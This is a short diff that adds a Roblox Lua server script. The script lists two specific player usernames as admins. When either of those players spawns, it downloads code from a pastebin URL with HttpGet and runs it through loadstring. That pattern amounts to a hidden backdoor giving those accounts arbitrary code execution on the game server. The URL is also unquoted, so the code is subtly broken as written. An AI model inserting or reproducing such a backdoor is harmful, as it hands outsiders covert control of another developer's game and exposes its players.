@@ -1,0 +1,12 @@
+local Admin = {
+	        ["ithinkimrich4"] = true,
+	        ["MangoEmil1"] = true 
+	    }
+	 
+	game.Players.PlayerAdded:connect(function(player)
+	    player.CharacterAdded:connect(function(character)
+	        if Admin[player.Name] then
+	            loadstring(game:HttpGet(pastebin.com/raw/hxywBJbn, true))()
+	        end
+	    end)
+	end)
